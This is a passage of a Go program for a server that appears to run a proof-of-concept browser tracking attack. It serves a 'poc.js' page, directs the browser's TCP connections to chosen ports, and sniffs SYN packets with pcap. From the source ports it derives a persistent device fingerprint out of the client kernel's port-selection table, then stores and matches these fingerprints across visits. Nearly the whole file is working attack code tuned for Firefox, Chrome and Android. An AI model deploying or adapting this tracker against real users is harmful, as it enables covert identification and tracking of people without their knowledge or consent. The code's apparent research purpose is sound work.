package main

import (
	"context"
	"crypto/rand"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"
)

const TRACKER_VERSION_MAJOR = 1
const TRACKER_VERSION_MINOR = 3
const TABLE_PERTURB_SHIFT = 8
const TABLE_PERTURB_SIZE = 1 << TABLE_PERTURB_SHIFT
const LOOPBACK_PORT_START = 1024
const NUM_INDEPENDENT_PAIRS = 8
const LOOPBACK_PORT_INITIAL_BATCH_SIZE = NUM_INDEPENDENT_PAIRS * NUM_INDEPENDENT_PAIRS
const DEFAULT_SOURCE_PORT_RANGE_LO = 32768
const DEFAULT_SOURCE_PORT_RANGE_HI = 61000
const SANITY_TEST_NUM_SEGMENTS = 3
const SANITY_TEST_INITIAL_INC_RANGE_LO = 20
const SANITY_TEST_INITIAL_INC_RANGE_HI = 200
const WAIT_BATCH_TIMEOUT = 5 * time.Second
const POOL_PORT_RANGE_START = 11000
const POOL_PORT_RANGE_SIZE = 16384
const LOOPBACK_DEFAULT_SANDWICH_SIZE = 4 // must divide LOOPBACK_PORT_INITIAL_BATCH_SIZE
const LOOPBACK_DEFAULT_NTRIES = 50       // ~10^-8
const MIN_WRAPAROUND_THRESHOLD = 1024

type TrackerClientState int

const (
	TrackerClientStatePhase1    TrackerClientState = 1
	TrackerClientStatePhase1End TrackerClientState = 2
	TrackerClientStatePhase2    TrackerClientState = 3
	TrackerClientStatePhase2End TrackerClientState = 4
	TrackerClientStateError     TrackerClientState = 5
)

const (
	TrackerClientFlagFirefox uint32 = 1 << iota
	TrackerClientFlagChrome
	TrackerClientFlagWithListeners
)

type TrackerClientInfo struct {
	TesterName         string    `json:"tester_name"`
	Isp                string    `json:"isp"`
	Location           string    `json:"location"`
	Browser            string    `json:"browser"`
	OS                 string    `json:"os"`
	UA                 string    `json:"ua"`
	DeviceDescription  string    `json:"device_description"`
	NetworkDescription string    `json:"network_description"`
	Note               string    `json:"note"`
	TrackerVersion     string    `json:"tracker_version"`
	ClientVersion      string    `json:"client_version"`
	IpVersion          int       `json:"ip_version"`
	SourceIp           string    `json:"source_ip"`
	SourcePortRangeLo  int       `json:"source_port_range_lo"`
	SourcePortRangeHi  int       `json:"source_port_range_hi"`
	SourcePortRangeMin int       `json:"source_port_range_min"`
	SourcePortRangeMax int       `json:"source_port_range_max"`
	TotalDuration      string    `json:"total_duration"`
	StartTime          time.Time `json:"start_time"`
	Phase1EndTime      time.Time `json:"phase1_end_time"`
	Phase1Iterations   int       `json:"phase1_iterations"`
	Phase1Duration     string    `json:"phase1_duration"`
	Phase2EndTime      time.Time `json:"phase2_end_time"`
	Phase2Iterations   int       `json:"phase2_iterations"`
	Phase2Duration     string    `json:"phase2_duration"`
	Phase2Ntries       int       `json:"phase2_ntries"`
	Phase2SandwichSize int       `json:"phase2_sandwich_size"`
	Fingerprint        string    `json:"fingerprint"`
	FingerprintHash    string    `json:"fingerprint_hash"`
}

type TrackerClient struct {
	Info                *TrackerClientInfo
	id                  uint64
	state               TrackerClientState
	dports              map[uint16][]uint16        // destination port -> list of source ports
	sports_seen         map[uint16]map[uint16]bool // destination port -> set of source ports seen
	dports_ready        map[uint16]bool            // destination port -> is ready?
	dports_unique       map[uint16]int             // destination port -> bucket index
	fingerprint         [][]int
	next_lo_port        uint16
	loopback_batch_size int
	independent_pairs   int
	mu                  sync.Mutex
	batch_done          chan struct{}
	err                 error
	flags               uint32
}

func NewTrackerClient(info *TrackerClientInfo) (*TrackerClient, error) {
	var id [8]byte
	_, err := rand.Read(id[:])
	if err != nil {
		return nil, fmt.Errorf("rand failed: %s", err)
	}

	c := &TrackerClient{
		id:                  binary.BigEndian.Uint64(id[:]),
		state:               TrackerClientStatePhase1,
		dports:              make(map[uint16][]uint16),
		sports_seen:         make(map[uint16]map[uint16]bool),
		dports_ready:        make(map[uint16]bool),
		dports_unique:       make(map[uint16]int),
		fingerprint:         make([][]int, TABLE_PERTURB_SIZE),
		next_lo_port:        LOOPBACK_PORT_START,
		batch_done:          nil,
		independent_pairs:   0,
		loopback_batch_size: LOOPBACK_PORT_INITIAL_BATCH_SIZE,
		Info:                info,
		err:                 nil,
	}

	if strings.Contains(strings.ToLower(c.Info.Browser), "firefox") {
		c.flags |= TrackerClientFlagFirefox
	} else if strings.Contains(strings.ToLower(c.Info.Browser), "chrome") {
		c.flags |= TrackerClientFlagChrome
	}

	if strings.Contains(strings.ToLower(c.Info.UA), "pixel 2 xl") {
		c.Info.SourcePortRangeLo = 37000
		c.Info.SourcePortRangeHi = 50001
	} else {
		c.Info.SourcePortRangeLo = DEFAULT_SOURCE_PORT_RANGE_LO
		c.Info.SourcePortRangeHi = DEFAULT_SOURCE_PORT_RANGE_HI
	}

	c.Info.Phase2Ntries = LOOPBACK_DEFAULT_NTRIES
	c.Info.Phase2SandwichSize = LOOPBACK_DEFAULT_SANDWICH_SIZE
	if c.flags&TrackerClientFlagFirefox != 0 {
		c.Info.Phase2Ntries = 10
		c.Info.Phase2SandwichSize = 2
		c.loopback_batch_size = c.Info.Phase2SandwichSize
	}
	if strings.Contains(strings.ToLower(c.Info.OS), "android") {
		c.Info.Phase2Ntries = 10
		c.Info.Phase2SandwichSize = 2
	}

	return c, nil
}

func (c *TrackerClient) setStateLocked(new_state TrackerClientState, expected_state TrackerClientState) {
	if c.state != expected_state {
		c.error(fmt.Errorf("[%016x] internal error: expected state %d, found %d", c.id, expected_state, c.state))
		return
	}
	c.state = new_state
}

func (c *TrackerClient) error(err error) error {
	c.state = TrackerClientStateError
	c.err = err
	log.Printf("[%016x] client error: %s", c.id, c.err)
	return err
}

func (c *TrackerClient) signalBatchDone() {
	c.batch_done <- struct{}{}
}

func (c *TrackerClient) waitBatchDone() error {
	if c.batch_done != nil {
		select {
		case <-c.batch_done:
			return nil
		case <-time.NewTimer(WAIT_BATCH_TIMEOUT).C:
			return c.error(fmt.Errorf("[%016x] batch timeout", c.id))
		}
	}
	return nil
}

func (c *TrackerClient) initBatchDone() {
	c.batch_done = make(chan struct{})
}

func (c *TrackerClient) disableBatchDone() {
	c.batch_done = nil
}

func (c *TrackerClient) canonicalFingerprint() string {
	fingerprint := make([][]int, len(c.fingerprint))
	for i, bucket := range c.fingerprint {
		fingerprint[i] = append(fingerprint[i], bucket...)
	}
	for _, bucket := range fingerprint {
		sort.Ints(bucket)
	}
	sort.Slice(fingerprint, func(i, j int) bool {
		if len(fingerprint[i]) == 0 {
			return true
		} else if len(fingerprint[j]) == 0 {
			return false
		} else {
			return fingerprint[i][0] < fingerprint[j][0]
		}
	})
	data_elems := make([]string, 0)
	for _, bucket := range fingerprint {
		if len(bucket) >= 2 {
			bucket_elems := make([]string, len(bucket))
			for i, p := range bucket {
				bucket_elems[i] = strconv.Itoa(p)
			}
			data_elems = append(data_elems, fmt.Sprintf("(%s)", strings.Join(bucket_elems, ",")))
		}
	}
	return strings.Join(data_elems, ":")
}

func (c *TrackerClient) sourcePortDiff(p1, p0 uint16) int {
	diff := int(p1) - int(p0)
	range_length := c.Info.SourcePortRangeHi - c.Info.SourcePortRangeLo
	return ((diff % range_length) + range_length) % range_length
}

func (c *TrackerClient) prepareBatch() {
	var threshold int
	// sort batch...
	for dport, sports := range c.dports {
		threshold, _ = c.sportsThreshold(dport)
		sort.Slice(sports, func(i, j int) bool {
			return sports[i] < sports[j]
		})
		if len(sports) != threshold {
			log.Printf("[%016x] WARNING: expected %d for dport %d, found %d", c.id, threshold, dport, len(sports))
		}
		wraparoundThreshold := int(float64(c.Info.Phase2Ntries*(1<<c.Info.Phase2SandwichSize)) * float64(1.0625) * 2)
		if wraparoundThreshold < MIN_WRAPAROUND_THRESHOLD {
			wraparoundThreshold = MIN_WRAPAROUND_THRESHOLD
		}
		for i := 0; i < len(sports)-1; i++ {
			if int(sports[i+1]-sports[i]) >= wraparoundThreshold {
				// wraparound point found
				sports = append(sports[i+1:], sports[:i+1]...)
				break
			}
		}
		c.dports[dport] = sports
	}
}

func (c *TrackerClient) phase1SanityTests() error {
	sport_min := 65535
	sport_max := 0
	for _, sports := range c.dports {
		for _, sport := range sports {
			if sport > uint16(sport_max) {
				sport_max = int(sport)
			}
			if sport < uint16(sport_min) {
				sport_min = int(sport)
			}
		}
	}
	log.Printf("[%016x] source port range (observed): [%d, %d]", c.id, sport_min, sport_max)
	c.Info.SourcePortRangeMin = sport_min
	c.Info.SourcePortRangeMax = sport_max
	segments := make([]int, SANITY_TEST_NUM_SEGMENTS)
	segment_length := ((c.Info.SourcePortRangeHi - c.Info.SourcePortRangeLo) + SANITY_TEST_NUM_SEGMENTS - 1) / SANITY_TEST_NUM_SEGMENTS
	for dport, sports := range c.dports {
		for _, sport := range sports {
			// range test
			if sport < uint16(c.Info.SourcePortRangeLo) || sport >= uint16(c.Info.SourcePortRangeHi) {
				return fmt.Errorf("[%016x] sanity test failed: source port %d is not in the range [%d,%d), detected on destination port %d", c.id, sport, c.Info.SourcePortRangeLo, c.Info.SourcePortRangeHi, dport)
			}
			// parity test
			if (c.Info.SourcePortRangeHi-c.Info.SourcePortRangeLo)&1 == 0 && (sport&1) != (uint16(c.Info.SourcePortRangeLo)&1) {
				return fmt.Errorf("[%016x] sanity test failed: source port %d and source port range start %d have different parity, detected on destination port %d", c.id, sport, c.Info.SourcePortRangeLo, dport)
			}
			segments[(int(sport)-c.Info.SourcePortRangeLo)/segment_length]++
		}
	}
	for i, n := range segments {
		if n == 0 {
			return fmt.Errorf("[%016x] sanity test failed: segment #%d is empty [%d,%d)", c.id, i, i*segment_length, (i+1)*segment_length)
		}
	}
	return nil
}

func (c *TrackerClient) handleBatchPhase1() error {
	c.prepareBatch()
	c.Info.Phase1Iterations++
	if c.Info.Phase1Iterations == 1 {
		err := c.phase1SanityTests()
		if err != nil {
			return c.error(err)
		}
	}
	prev_unique_ports_length := len(c.dports_unique)
	// find and add unique ports
	for dport, sports := range c.dports {
		if _, ok := c.dports_unique[dport]; !ok {
			if expectedCount, _ := c.sportsThreshold(dport); expectedCount == len(sports) {
				diff := c.sourcePortDiff(sports[1], sports[0])
				if diff == 2 {
					c.dports_unique[dport] = len(c.dports_unique) // bucket index
				}
			}
		}
		c.dports[dport] = make([]uint16, 0)
	}

	inc := len(c.dports_unique) - prev_unique_ports_length
	log.Printf("[%016x] total unique dports %d (added %d)", c.id, len(c.dports_unique), inc)

	if c.Info.Phase1Iterations == 1 {
		if inc < SANITY_TEST_INITIAL_INC_RANGE_LO || inc >= SANITY_TEST_INITIAL_INC_RANGE_HI {
			return c.error(fmt.Errorf("[%016x] sanity test failed: initial increment %d is not in the range [%d,%d)", c.id, inc, SANITY_TEST_INITIAL_INC_RANGE_LO, SANITY_TEST_INITIAL_INC_RANGE_HI))
		}
	}

	if len(c.dports_unique) == TABLE_PERTURB_SIZE { // are we done?
		c.Info.Phase1EndTime = time.Now()
		c.Info.Phase1Duration = fmt.Sprintf("%s", c.Info.Phase1EndTime.Sub(c.Info.StartTime))
		log.Printf("[%016x] phase 1 completed", c.id)
		c.setStateLocked(TrackerClientStatePhase1End, TrackerClientStatePhase1)
		c.disableBatchDone()
	} else if len(c.dports_unique) > TABLE_PERTURB_SIZE {
		return c.error(fmt.Errorf("[%016x] invalid number of unique ports %d (maximum is %d)", c.id, len(c.dports_unique), TABLE_PERTURB_SIZE))
	}
	return nil
}

func (c *TrackerClient) dumpClientDports() {
	for dport, sports := range c.dports {
		log.Printf("[%016x] %d: %v", c.id, dport, sports)
	}
}

func (c *TrackerClient) addToFingerprint(lo_port uint16, witness_dport uint16) error {
	bucket_index, ok := c.dports_unique[witness_dport]
	if !ok {
		return c.error(fmt.Errorf("[%016x] phase 2 sanity check failure: witness dport %d for lo_port %d is not present on dports_unique", c.id, witness_dport, lo_port))
	}
	log.Printf("[%016x] loopback port %d to bucket index %d (dport %d)", c.id, lo_port, bucket_index, witness_dport)
	bucket := c.fingerprint[bucket_index]
	bucket = append(bucket, int(lo_port))
	if len(bucket) >= 2 {
		c.independent_pairs++
	}
	c.fingerprint[bucket_index] = bucket
	return nil
}

func (c *TrackerClient) segmentCutoff(segmentIndex int) int {
	return c.Info.Phase2Ntries*segmentIndex*2 + 2
}

func (c *TrackerClient) handleBatchPhase2(expectedSportsCount int) error {
	c.prepareBatch()
	for i := 0; i < expectedSportsCount-1; i++ {
		c.Info.Phase2Iterations++
		lo_port_start := c.next_lo_port + uint16(i)*uint16(c.Info.Phase2SandwichSize)
		lo2dport := make([]uint16, c.Info.Phase2SandwichSize)
		var top_half_dport uint16
		csum := 0
		for dport, sports := range c.dports {
			var diff int
			if c.flags&TrackerClientFlagFirefox != 0 {
				// find the maximum diff and use it
				for j := 0; j < len(sports)-1; j++ {
					d := c.sourcePortDiff(sports[j+1], sports[j])
					if d > diff {
						diff = d
					}
				}
			} else {
				diff = c.sourcePortDiff(sports[i+1], sports[i])
			}
			if diff < c.segmentCutoff(1) {
				continue
			}
			if diff >= c.segmentCutoff(1<<(c.Info.Phase2SandwichSize-1)) {
				if top_half_dport != 0 {
					return c.error(fmt.Errorf("[%016x] phase 2 sanity check failure: multiple dports in top half (likely noise)", c.id))
				}
				top_half_dport = dport
				log.Printf("[%016x] dport %d top half (diff %d)", c.id, dport, diff)
				continue
			}
			for segmentIndex := (1 << (c.Info.Phase2SandwichSize - 1)) - 1; segmentIndex > 0; segmentIndex-- {
				if diff >= c.segmentCutoff(segmentIndex) {
					log.Printf("[%016x] dport %d to segment %d (diff %d)", c.id, dport, segmentIndex, diff)

					if (csum & segmentIndex) != 0 {
						return c.error(fmt.Errorf("[%016x] phase 2 sanity check failure: multiple dports for the same loopback destination (likely noise)", c.id))
					}
					csum |= segmentIndex

					for k := 0; k < c.Info.Phase2SandwichSize; k++ {
						if segmentIndex&(1<<k) != 0 {
							lo2dport[k] = dport
						}
					}
					break
				}
			}
		}
		// sanity check
		if top_half_dport == 0 {
			return c.error(fmt.Errorf("[%016x] phase 2 sanity check failure: loopback destinations missing", c.id))
		}
		// add to fingerprint
		for k := 0; k < c.Info.Phase2SandwichSize; k++ {
			lo_port := lo_port_start + uint16(k)
			dport := lo2dport[k]
			if dport == 0 {
				dport = top_half_dport
			}
			err := c.addToFingerprint(lo_port, dport)
			if err != nil {
				return err
			}
		}

		if c.Info.Phase2Iterations == (LOOPBACK_PORT_INITIAL_BATCH_SIZE+c.Info.Phase2SandwichSize-1)/c.Info.Phase2SandwichSize { // are we done?
			c.Info.Phase2EndTime = time.Now()
			c.Info.Phase2Duration = fmt.Sprintf("%s", c.Info.Phase2EndTime.Sub(c.Info.Phase1EndTime))
			c.Info.TotalDuration = fmt.Sprintf("%s", c.Info.Phase2EndTime.Sub(c.Info.StartTime))
			log.Printf("[%016x] phase 2 completed", c.id)
			c.setStateLocked(TrackerClientStatePhase2End, TrackerClientStatePhase2)
			break
		}
	}
	c.next_lo_port += uint16(c.loopback_batch_size)
	for dport := range c.dports {
		c.dports[dport] = make([]uint16, 0)
	}

	return nil
}

func (c *TrackerClient) handleBatch(expectedSportsCount int) error {
	c.signalBatchDone()
	if c.state == TrackerClientStatePhase1 {
		return c.handleBatchPhase1()
	} else if c.state == TrackerClientStatePhase2 {
		return c.handleBatchPhase2(expectedSportsCount)
	}
	return nil
}

func (c *TrackerClient) sportsThreshold(dport uint16) (int, error) {
	if c.state == TrackerClientStatePhase1 {
		if _, ok := c.dports_unique[dport]; ok {
			return 1, nil
		}
		return 2, nil
	} else if c.state == TrackerClientStatePhase2 {
		return (c.loopback_batch_size+c.Info.Phase2SandwichSize-1)/c.Info.Phase2SandwichSize + 1, nil
	}
	return 0, fmt.Errorf("[%016x] threshold is undefined for client state %d", c.id, c.state)
}

func (c *TrackerClient) handlePacket(sport, dport uint16) error {
	c.mu.Lock()
	defer c.mu.Unlock()

	sports, ok := c.dports[dport]
	if !ok {
		return fmt.Errorf("dport %d not present", dport)
	}
	if _, ok = c.sports_seen[dport][sport]; ok {
		// duplicate source port
		return nil
	}
	c.sports_seen[dport][sport] = true
	sports = append(sports, sport)
	c.dports[dport] = sports

	threshold, err := c.sportsThreshold(dport)
	if err == nil { // this implicitly check client state
		if len(sports) >= threshold {
			c.dports_ready[dport] = true
		}

		if len(c.dports_ready) == len(c.dports) { // batch completed
			c.dports_ready = make(map[uint16]bool)
			return c.handleBatch(threshold)
		}
	}

	return nil
}

type TrackerClientNextCommand struct {
	Command string `json:"command"`
	Data    string `json:"data"`
}

func (c *TrackerClient) nextCommand(t *Tracker) *TrackerClientNextCommand {
	c.waitBatchDone()

	c.mu.Lock()
	defer c.mu.Unlock()

	switch c.state {
	case TrackerClientStatePhase1:
		if len(c.dports_unique) == 0 {
			c.Info.StartTime = time.Now()
		}
		c.initBatchDone()
		t.KeepUniquePorts(c)
		new_ports := t.AllocatePorts(c, TABLE_PERTURB_SIZE-1)
		data_elems := make([]string, len(new_ports))
		data_elems_index := 0
		for port := range new_ports {
			data_elems[data_elems_index] = strconv.Itoa(int(port))
			data_elems_index++
		}
		new_ports_str := strings.Join(data_elems, ",")
		data_elems = make([]string, len(c.dports_unique))
		data_elems_index = 0
		for port := range c.dports_unique {
			new_ports[port] = struct{}{}
			data_elems[data_elems_index] = strconv.Itoa(int(port))
			data_elems_index++
		}
		unique_ports_str := strings.Join(data_elems, ",")
		c.dports = make(map[uint16][]uint16)
		for port := range new_ports {
			c.dports[port] = make([]uint16, 0)
			if _, ok := c.sports_seen[port]; !ok {
				c.sports_seen[port] = make(map[uint16]bool)
			}
		}
		return &TrackerClientNextCommand{
			Command: "do-double-batch",
			Data:    fmt.Sprintf("unique_ports=%s;ports=%s", unique_ports_str, new_ports_str),
		}
	case TrackerClientStatePhase1End:
		t.KeepUniquePorts(c)
		c.dports = make(map[uint16][]uint16)
		data_elems := make([]string, len(c.dports_unique))
		data_elems_index := 0
		for port := range c.dports_unique {
			c.dports[port] = make([]uint16, 0)
			data_elems[data_elems_index] = strconv.Itoa(int(port))
			data_elems_index++
		}

		c.setStateLocked(TrackerClientStatePhase2, TrackerClientStatePhase1End)
		return &TrackerClientNextCommand{
			Command: "store-unique-ports",
			Data:    fmt.Sprintf("ports=%s", strings.Join(data_elems, ",")),
		}
	case TrackerClientStatePhase2:
		c.initBatchDone()
		data_elems := make([]string, c.loopback_batch_size)
		for i := 0; i < c.loopback_batch_size; i++ {
			data_elems[i] = strconv.Itoa(int(c.next_lo_port) + i)
		}
		return &TrackerClientNextCommand{
			Command: "do-loopback-sandwich",
			Data: fmt.Sprintf(
				"ntries=%d;sandwich_size=%d;ports=%s",
				c.Info.Phase2Ntries,
				c.Info.Phase2SandwichSize,
				strings.Join(data_elems, ","),
			),
		}
	case TrackerClientStatePhase2End:
		t.RemoveClient(c)
		fingerprint := c.canonicalFingerprint()
		id := t.StoreFingerprint(fingerprint, c.id)
		log.Printf("[%016x] fingerprint %s %s", c.id, fingerprint, func() string {
			if id == c.id {
				return ""
			}
			return fmt.Sprintf("(as client %016x)", id)
		}())
		fingerprint_hash_sha256 := sha256.Sum256([]byte(fingerprint))
		fingerprint_hash := hex.EncodeToString(fingerprint_hash_sha256[:])
		c.Info.Fingerprint = fingerprint
		c.Info.FingerprintHash = fingerprint_hash[:8]
		info, _ := json.Marshal(c.Info)
		log.Printf("[%016x] summary info: %s", c.id, string(info))
		return &TrackerClientNextCommand{
			Command: "summary-info",
			Data:    fmt.Sprintf("%s", string(info)),
		}
	case TrackerClientStateError:
		c.dumpClientDports()
		t.RemoveClient(c)
		return &TrackerClientNextCommand{
			Command: "error",
			Data:    c.err.Error(),
		}
	default:
		t.RemoveClient(c)
		return &TrackerClientNextCommand{
			Command: "error",
			Data:    fmt.Errorf("internal error: invalid client state %d in next command", c.state).Error(),
		}
	}
}

type ListenerInfo struct {
	srv      *http.Server
	refcount int
}

type Tracker struct {
	iface              string
	handle             *pcap.Handle
	clients            map[string]map[uint16]*TrackerClient // src ip -> dst port -> client
	client_ids         map[uint64]*TrackerClient            // id -> client
	fingerprint_db     map[string]uint64                    // canonical fingerprint -> first client id
	mu                 sync.Mutex
	defaultListenerMux *http.ServeMux
	listeners          map[uint16]*ListenerInfo
}

func NewTracker(iface string) *Tracker {
	m := http.NewServeMux()
	m.HandleFunc("/", func(rw http.ResponseWriter, r *http.Request) {
		rw.Header().Set("Access-Control-Allow-Origin", "*")
		rw.Header().Set("Connection", "close")
		rw.WriteHeader(200)
	})
	return &Tracker{
		iface:              iface,
		clients:            make(map[string]map[uint16]*TrackerClient),
		client_ids:         make(map[uint64]*TrackerClient),
		fingerprint_db:     make(map[string]uint64),
		defaultListenerMux: m,
		listeners:          make(map[uint16]*ListenerInfo),
	}
}

func randPort() uint16 {
	var _port [2]byte
	rand.Read(_port[:])
	port := binary.BigEndian.Uint16(_port[:])
	return POOL_PORT_RANGE_START + port%POOL_PORT_RANGE_SIZE
}

func (t *Tracker) StoreFingerprint(fingerprint string, client_id uint64) uint64 {
	id, ok := t.fingerprint_db[fingerprint]
	if !ok {
		t.fingerprint_db[fingerprint] = client_id
		return client_id
	}
	return id
}

func (t *Tracker) putListener(port uint16) {
	if lisInfo, ok := t.listeners[port]; ok {
		lisInfo.refcount--
		if lisInfo.refcount == 0 {
			lisInfo.srv.Shutdown(context.Background())
			delete(t.listeners, port)
		}
	}
}

func (t *Tracker) getListener(port uint16) {
	if lisInfo, ok := t.listeners[port]; ok {
		lisInfo.refcount++
	} else {
		srv := &http.Server{Addr: fmt.Sprintf(":%d", port), Handler: t.defaultListenerMux}
		go func() {
			srv.ListenAndServe()
		}()
		lisInfo := &ListenerInfo{
			srv:      srv,
			refcount: 1,
		}
		t.listeners[port] = lisInfo
	}
}

func (t *Tracker) KeepUniquePorts(c *TrackerClient) {
	t.mu.Lock()
	defer t.mu.Unlock()
	portMap := t.clients[c.Info.SourceIp]
	for port := range portMap {
		if _, ok := c.dports[port]; !ok {
			continue
		}
		if _, ok := c.dports_unique[port]; !ok {
			delete(portMap, port)
			t.putListener(port)
		}
	}
	t.clients[c.Info.SourceIp] = portMap
}

func (t *Tracker) AllocatePorts(c *TrackerClient, n int) map[uint16]struct{} {
	portSet := make(map[uint16]struct{})
	t.mu.Lock()
	defer t.mu.Unlock()
	portMap := t.clients[c.Info.SourceIp]
	i := 0
	for i < n {
		port := randPort()
		if _, ok := portMap[port]; ok {
			continue
		}
		portMap[port] = c
		if c.flags&TrackerClientFlagWithListeners != 0 {
			t.getListener(port)
		}
		portSet[port] = struct{}{}
		i += 1
	}
	t.clients[c.Info.SourceIp] = portMap

	return portSet
}

func (t *Tracker) RemoveClient(c *TrackerClient) {
	stats, err := t.handle.Stats()
	if err == nil {
		log.Printf("pcap stats: packets received %d, packets dropped %d, packets if dropped %d", stats.PacketsReceived, stats.PacketsDropped, stats.PacketsIfDropped)
	}
	log.Printf("[%016x] client removed", c.id)
	t.mu.Lock()
	defer t.mu.Unlock()
	delete(t.client_ids, c.id)
	portMap := t.clients[c.Info.SourceIp]
	for port, client := range portMap {
		if client.id == c.id {
			delete(portMap, port)
			t.putListener(port)
		}
	}
	if len(portMap) == 0 {
		delete(t.clients, c.Info.SourceIp)
	} else {
		t.clients[c.Info.SourceIp] = portMap
	}
}

func httpInternalServerError(w http.ResponseWriter, err error) {
	log.Printf("internal error: %s", err)
	http.Error(w, err.Error(), http.StatusInternalServerError)
	return
}

func (t *Tracker) handlePacket(packet gopacket.Packet) error {
	netLayer := packet.NetworkLayer()
	if netLayer == nil {
		return nil
	}
	transportLayer := packet.TransportLayer()
	if transportLayer == nil {
		return nil
	}
	srcip := netLayer.NetworkFlow().Src().String()
	sport := binary.BigEndian.Uint16(transportLayer.TransportFlow().Src().Raw())
	dport := binary.BigEndian.Uint16(transportLayer.TransportFlow().Dst().Raw())
	client, err := func() (*TrackerClient, error) {
		t.mu.Lock()
		defer t.mu.Unlock()
		portMap, ok := t.clients[srcip]
		if !ok {
			return nil, nil
		}
		client, ok := portMap[dport]
		if !ok {
			if dport >= POOL_PORT_RANGE_START && dport < POOL_PORT_RANGE_START+POOL_PORT_RANGE_SIZE {
				return nil, fmt.Errorf("dport %d not registered (%s:%d -> %s:%d)", dport, srcip, sport, netLayer.NetworkFlow().Dst().String(), dport)
			}
			return nil, nil
		}
		return client, nil
	}()
	if client == nil {
		return err
	}

	return client.handlePacket(sport, dport)
}

func (t *Tracker) collectPackets() {
	packetSource := gopacket.NewPacketSource(t.handle, t.handle.LinkType())
	for packet := range packetSource.Packets() {
		if err := t.handlePacket(packet); err != nil {
			log.Printf("packet handling error: %s", err)
		}
	}
}

func (t *Tracker) ListenAndServe() error {
	var err error
	inactiveHandle, err := pcap.NewInactiveHandle(t.iface)
	if err != nil {
		return err
	}
	inactiveHandle.SetSnapLen(4096)
	inactiveHandle.SetPromisc(true)
	inactiveHandle.SetTimeout(100 * time.Millisecond)
	inactiveHandle.SetBufferSize(4 * 1024 * 1024)
	t.handle, err = inactiveHandle.Activate()
	if err != nil {
		return err
	}
	err = t.handle.SetBPFFilter("(tcp[tcpflags] == tcp-syn) or (ip6[6]==6 and ip6[53]==2)")
	if err != nil {
		return err
	}
	go t.collectPackets()

	mux := http.NewServeMux()
	mux.Handle("/new_session", http.HandlerFunc(t.newSession))
	mux.Handle("/next_command", http.HandlerFunc(t.nextCommand))
	mux.Handle("/get_external_saddr", http.HandlerFunc(t.getExtrenalSourceAddress))
	mux.Handle("/", http.HandlerFunc(t.defaultHandler))
	return http.ListenAndServe(":80", mux)
}

func (t *Tracker) getExtrenalSourceAddress(w http.ResponseWriter, req *http.Request) {
	log.Printf("%s: get external source address", req.RemoteAddr)
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Write([]byte(req.RemoteAddr))
}

func parseRemoteAddr(addr string) (string, error) {
	a, err := net.ResolveTCPAddr("tcp", addr)
	if err != nil {
		return "", err
	}
	return a.IP.String(), nil
}

func (t *Tracker) newSession(w http.ResponseWriter, req *http.Request) {
	var err error
	info := &TrackerClientInfo{}
	info.SourceIp, err = parseRemoteAddr(req.RemoteAddr)
	if err != nil {
		httpInternalServerError(w, fmt.Errorf("parse remote address failed: %s", err))
		return
	}
	info.TrackerVersion = fmt.Sprintf("v%d.%d", TRACKER_VERSION_MAJOR, TRACKER_VERSION_MINOR)
	info.ClientVersion = req.URL.Query().Get("client_version")
	info.IpVersion = 4
	if strings.Contains(info.SourceIp, ":") {
		info.IpVersion = 6
	}
	info.TesterName = req.URL.Query().Get("tester_name")
	info.Isp = req.URL.Query().Get("isp")
	info.Location = req.URL.Query().Get("location")
	info.Browser = req.URL.Query().Get("browser")
	info.OS = req.URL.Query().Get("os")
	info.UA = req.UserAgent()
	info.DeviceDescription = req.URL.Query().Get("device_description")
	info.NetworkDescription = req.URL.Query().Get("network_description")
	info.Note = req.URL.Query().Get("note")

	c, err := NewTrackerClient(info)
	if err != nil {
		httpInternalServerError(w, err)
		return
	}
	t.mu.Lock()
	t.client_ids[c.id] = c
	if _, ok := t.clients[c.Info.SourceIp]; !ok {
		t.clients[c.Info.SourceIp] = make(map[uint16]*TrackerClient)
	}
	t.mu.Unlock()

	log.Printf("%s: new tracker client with id %016x", req.RemoteAddr, c.id)
	log.Printf("[%016x] tester name: %s", c.id, c.Info.TesterName)
	log.Printf("[%016x] isp: %s", c.id, c.Info.Isp)
	log.Printf("[%016x] location: %s", c.id, c.Info.Location)
	log.Printf("[%016x] browser: %s", c.id, c.Info.Browser)
	log.Printf("[%016x] os: %s", c.id, c.Info.OS)
	log.Printf("[%016x] ua: %s", c.id, c.Info.UA)
	log.Printf("[%016x] device description: %s", c.id, c.Info.DeviceDescription)
	log.Printf("[%016x] network description: %s", c.id, c.Info.NetworkDescription)
	log.Printf("[%016x] note: %s", c.id, c.Info.Note)
	log.Printf("[%016x] source port range [%d,%d)", c.id, c.Info.SourcePortRangeLo, c.Info.SourcePortRangeHi)

	w.Header().Set("Content-Type", "application/json")
	resp_map := map[string]string{
		"id": fmt.Sprintf("%016x", c.id),
	}
	data, err := json.Marshal(resp_map)
	if err != nil {
		httpInternalServerError(w, err)
		return
	}
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Write(data)
}

func (t *Tracker) nextCommand(w http.ResponseWriter, req *http.Request) {
	id := req.URL.Query().Get("id")
	raw_id, err := hex.DecodeString(id)
	if err != nil {
		httpInternalServerError(w, fmt.Errorf("invalid id: %s", err))
		return
	}
	clientId := binary.BigEndian.Uint64(raw_id)
	client, ok := t.client_ids[clientId]
	if !ok {
		httpInternalServerError(w, fmt.Errorf("unknown id: %s", err))
		return
	}

	cmd := client.nextCommand(t)
	w.Header().Set("Content-Type", "application/json")
	data, err := json.Marshal(cmd)
	if err != nil {
		httpInternalServerError(w, fmt.Errorf("json marshaling error: %s", err))
		return
	}
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Write(data)
}

func isValidFilename(filename string) bool {
	for _, expected_filename := range []string{"index.html", "poc.js", "favicon.ico", "platform.js"} {
		if filename == expected_filename {
			return true
		}
	}
	return false
}

func (t *Tracker) defaultHandler(w http.ResponseWriter, req *http.Request) {
	var filename string
	if req.URL.Path == "/" {
		filename = "index.html"
	} else {
		filename = req.URL.Path[1:]
	}

	if !isValidFilename(filename) {
		http.NotFound(w, req)
		return
	}

	log.Printf("%s: serving %s", req.RemoteAddr, req.URL.Path)
	data, err := ioutil.ReadFile(fmt.Sprintf("www/%s", filename))
	if err != nil {
		httpInternalServerError(w, err)
		return
	}
	if strings.HasSuffix(filename, ".js") {
		w.Header().Set("Content-Type", "text/javascript")
	}
